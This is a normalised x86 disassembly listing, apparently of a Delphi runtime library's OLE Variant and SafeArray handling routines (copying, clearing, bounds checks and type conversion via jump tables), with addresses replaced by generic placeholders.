mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40ee28
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40ee28
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40ef84
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ee28
mov eax [ ebp - 0x314 ]
call sub_40f1d8
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40f15c
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40ee28
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_404038
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_4146ec
test al al
je r-xdata
mov eax ebx
call sub_40efe0
jmp r-xdata
push ebx
call VariantClear
call sub_40ee28
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40f1f4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f224
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f224
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f280
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ee28
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40ee28
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40f1d8
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40eb80
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40ee28
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40ee28
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f1f4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40f224
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ee28
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40ee28
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f454
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40f15c
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40ee28
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_40408c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_4146ec
test al al
je r-xdata
mov ecx sub_40f44c
mov edx esi
mov eax ebx
call sub_40f280
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40ee28
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f500
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f454
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40f15c
sub_40f544
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f5a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f500
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f7cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f5a7
lea eax [ ebp - 0x10 ]
call sub_40f1d8
retn
sub_40f5b0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f5ee
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412c18
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4135c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f5f5
lea eax [ ebp - 0x4 ]
call sub_404744
retn
sub_40f5fc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f63a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4124f0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_41359c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f641
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40f648
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f686
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4132bc
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_41362c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f68d
lea eax [ ebp - 0x4 ]
call sub_405934
retn
sub_40f694
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f6d2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4131f0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413600
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f6d9
lea eax [ ebp - 0x4 ]
call sub_405934
retn
sub_40f6e0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40f7cc
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ee34
jmp r-xdata
mov edx esi
call sub_40e9a0
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ee34
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f760
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_4146ec
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f544
jmp r-xdata
mov edx esp
mov eax esi
call sub_4146ec
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f6e0
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40f7cc
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f500
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f7cc
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f811 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f5fc
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40ef40
jmp r-xdata
mov eax ebx
call sub_410138
mov edx eax
mov eax esi
call sub_413444
jmp r-xdata
mov eax ebx
call sub_40fb90
mov edx eax
mov eax esi
call sub_4133a4
jmp r-xdata
mov eax ebx
call sub_4114fc
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_413490
jmp r-xdata
mov eax ebx
call sub_411164
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_4134b4
jmp r-xdata
mov eax ebx
call sub_411e3c
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_4134e0
jmp r-xdata
mov eax ebx
call sub_4118d4
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_41350c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f5b0
jmp r-xdata
mov eax ebx
call sub_410c50
mov edx eax
mov eax esi
call sub_413538
jmp r-xdata
mov eax ebx
call sub_40ffe0
mov edx eax
mov eax esi
call sub_413424
jmp r-xdata
mov eax ebx
call sub_410090
mov edx eax
mov eax esi
call sub_4133c4
jmp r-xdata
mov eax ebx
call sub_410230
mov edx eax
mov eax esi
call sub_4133e4
jmp r-xdata
mov eax ebx
call sub_410308
mov edx eax
mov eax esi
call sub_413404
jmp r-xdata
mov eax ebx
call sub_410654
push edx
push eax
mov eax esi
call sub_413464
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f648
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f694
jmp r-xdata
mov dx 0x101
call sub_40e9a0
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40f1d8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f760
xor edx edx
mov ax 0x1
call sub_40e9a0
jmp r-xdata
sub_40f9f8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fa9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412c18
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4042c0
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_40840c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40faa2
lea eax [ ebp - 0xc ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_404744
retn
mov eax ebx
call sub_410c50
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40ee34
jmp r-xdata
sub_40faac
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40ee34
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40fae8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fb3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f500
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40fb90
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fb43
lea eax [ ebp - 0x14 ]
call sub_40f1d8
retn
sub_40fb4c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4146ec
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40fb90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40ffb1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fbc3 ]
mov eax [ ebp - 0x4 ]
call sub_40f9f8
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a78
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a78
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402a78
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a78
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f9f8
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fb90
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40faac
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fae8
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40e9a0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031e8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031e8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031e8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031e8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031e8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031e8
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40fb4c
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40faac
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40faac
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40fde7 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a78
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a78
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402a78
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a78
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f9f8
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fb90
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031e8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031e8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031e8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031e8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031e8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031e8
sub_40ffe0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40e9a0
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_41006c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fb90
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031e8
sub_410090
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40e9a0
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_410113
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fb90
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031e8
sub_410138
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_41020c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fb90
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_41015e ]
jmp [ eax * 4 + jump_table_410170 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031e8
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40e9a0
sub_410230
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_4102e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fb90
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_410252 ]
jmp [ eax * 4 + jump_table_410265 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031e8
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40e9a0
sub_410308
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_4103cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410654
test edx edx
je r-xdata
mov al [ eax + lookup_table_41032e ]
jmp [ eax * 4 + jump_table_410342 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031e8
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40e9a0
sub_4103f0
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_402a78
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40ee34
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
